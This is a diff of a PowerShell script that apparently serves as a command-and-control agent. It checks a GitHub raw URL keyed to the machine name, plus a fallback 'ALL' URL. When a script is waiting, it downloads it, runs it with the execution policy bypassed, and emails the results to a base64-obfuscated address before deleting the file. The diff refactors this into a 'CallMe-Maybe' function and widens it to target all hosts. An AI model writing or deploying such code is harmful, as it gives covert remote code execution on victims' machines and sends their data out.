@@ -11,7 +11,26 @@ function Send-ToEmail([string]$email,[string]$body,[string]$subj=[Environment]::
 
 
  }
- 
+ function CallMe-Maybe([string] $Url){
+    $name = [Environment]::MachineName
+    $receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
+    $file="$env:tmp\cd.ps1"
+    try {
+        Invoke-WebRequest -Uri $Url -UseBasicParsing -OutFile $file
+        $runn = powershell -executionpolicy bypass -file $file 2>&1 | Out-String
+        if($?){
+            $res=$contentWeb + [Environment]::NewLine + $runn
+            $don = "Done - "+$name; Send-ToEmail -email $receiver -body $res -subj $don
+        }
+    } catch {
+        $err = $_ | Out-String
+        $suberr = "Error - "+$name
+        Send-ToEmail -email $receiver -body $err -subj $suberr
+    }
+    finally {
+        Remove-Item -Path $file -Force
+    }
+ }
  function Get-UrlStatusCode([string] $Url)
 {
     try
@@ -25,7 +44,6 @@ function Send-ToEmail([string]$email,[string]$body,[string]$subj=[Environment]::
 }
 $name = [Environment]::MachineName
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
-$receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
 $statusCode = Get-UrlStatusCode $url
 if ($statusCode -eq 200){
     $contentLocal = "False"
@@ -36,25 +54,15 @@ if ($statusCode -eq 200){
         exit
     }
     elseif($diff) {
-        $file="$env:tmp\cd.ps1"
-        try {
-            Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
-            $runn = powershell -file $file 2>&1 | Out-String
-            if($?){
-                $res=$contentWeb + [Environment]::NewLine + $runn
-                $don = "Done - "+$name; Send-ToEmail -email $receiver -body $res -subj $don
+        CallMe-Maybe($url)
+    }
 
-            }
-        } catch {
-            $err = $_ | Out-String
-            $suberr = "Error - "+$name
-            Send-ToEmail -email $receiver -body $err -subj $suberr
-        }
-        finally {
-            Remove-Item -Path $file -Force
-        }
-    } 
+} elseif ((Get-UrlStatusCode "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/ALL") -eq 200){
+    CallMe-Maybe("https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/ALL")
 
 } else {
     Send-ToEmail -email $receiver -body $name -subj "UserNotFound"
 }
+
+
+ 
